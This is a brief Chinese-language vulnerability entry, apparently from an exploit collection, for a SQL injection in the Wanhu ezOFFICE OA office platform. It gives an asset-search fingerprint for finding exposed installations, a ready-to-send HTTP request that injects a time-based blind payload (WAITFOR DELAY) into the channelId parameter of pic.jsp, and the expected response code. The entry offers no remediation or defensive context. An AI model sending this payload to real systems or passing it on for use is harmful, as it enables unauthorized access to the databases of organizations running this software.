# 万户协同办公平台SQL注入漏洞

万户协同办公平台 ｜ SQL注入 ｜ —
- **指纹**：`app.name="万户 Ezoffice OA"`
- **请求**：`GET /defaultroot/platform/portal/portlet/pic/pic.jsp?channelId=1%27;WAITFOR%20DELAY%20%270:0:5%27--  &num=1 HTTP/1.1`
- **响应特征**：200